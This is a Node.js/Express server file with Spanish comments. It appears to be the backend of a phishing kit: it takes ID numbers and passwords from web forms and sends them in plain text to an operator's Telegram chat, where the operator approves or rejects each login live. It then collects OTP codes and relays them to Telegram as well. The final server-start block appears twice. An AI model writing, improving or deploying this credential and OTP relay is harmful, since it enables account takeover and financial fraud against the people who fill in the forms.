const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para procesar JSON y servir los archivos HTML de la carpeta 'public'
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Credenciales seguras (se configuran en Render, no en el código)
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Memoria temporal para guardar el estado de las solicitudes (en producción real se usa una BD)
const transacciones = {};

// --- RUTAS (ENDPOINTS) ---

// 1. Recibe los datos del HTML y envía el mensaje con botones a Telegram
app.post('/api/solicitar-acceso', async (req, res) => {
    const { documento, clave } = req.body;
    
    if (!documento || !clave) {
        return res.status(400).json({ status: 'error', message: 'Faltan datos' });
    }

    // Generamos un ID único para esta transacción
    const transaccionId = Date.now().toString();
    
    transacciones[transaccionId] = {
        estado: 'pendiente'
    };

    const mensaje = `🔔 *Nueva Solicitud de Acceso*\n\n` +
                    `📄 Documento: \`${documento}\`\n` +
                    `🔑 Clave: \`${clave}\`\n\n` +
                    `¿Permitir el acceso?`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Aceptar', callback_data: `aceptar_${transaccionId}` },
                        { text: '❌ Rechazar', callback_data: `rechazar_${transaccionId}` }
                    ]
                ]
            }
        });
        res.json({ status: 'ok', id: transaccionId });
    } catch (error) {
        console.error('Error Telegram:', error.message);
        res.status(500).json({ status: 'error', message: 'Fallo al conectar con Telegram' });
    }
});

// 2. El frontend consulta esta ruta cada 3 segundos para saber si ya diste clic
app.get('/api/verificar-estado/:id', (req, res) => {
    const transaccion = transacciones[req.params.id];
    if (transaccion) {
        res.json({ estado: transaccion.estado });
    } else {
        res.json({ estado: 'no_encontrada' });
    }
});

// 3. Webhook: Telegram avisa a tu servidor cuando presionas un botón
app.post('/telegram-webhook', async (req, res) => {
    const { callback_query } = req.body;

    if (callback_query) {
        const data = callback_query.data; // ej: "aceptar_1716300000000"
        const [accion, transaccionId] = data.split('_');

        if (transacciones[transaccionId]) {
            transacciones[transaccionId].estado = accion === 'aceptar' ? 'aceptado' : 'rechazado';

            try {
                // Responder a Telegram para quitar el relojito de carga en el botón
                await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
                    callback_query_id: callback_query.id,
                    text: `Solicitud ${accion}ada`
                });

                // Editar el mensaje original en Telegram para que ya no tenga botones
                await axios.post(`${TELEGRAM_API}/editMessageText`, {
                    chat_id: callback_query.message.chat.id,
                    message_id: callback_query.message.message_id,
                    text: `✅ Solicitud procesada. Acción: **${accion.toUpperCase()}**.`,
                    parse_mode: 'Markdown'
                });
            } catch (e) {
                console.error("Error actualizando mensaje:", e.message);
            }
        }
    }
    // Siempre respondemos 200 a Telegram para que no reintente el envío
    res.sendStatus(200);
});

// 4. NUEVO: Endpoint para recibir el OTP desde otp.html
app.post('/api/validar-otp', async (req, res) => {
    const { documento, clave, otp } = req.body;
    
    if (!otp) {
        return res.status(400).json({ status: 'error', message: 'Falta el OTP' });
    }

    const mensaje = `🔐 *Validación OTP Recibida*\n\n` +
                    `📄 Documento: \`${documento}\`\n` +
                    `🔑 Clave: \`${clave}\`\n` +
                    `🔢 Código OTP: \`${otp}\``;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
        });
        res.json({ status: 'ok' });
    } catch (error) {
        console.error('Error Telegram OTP:', error.message);
        res.status(500).json({ status: 'error' });
    }
});

// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
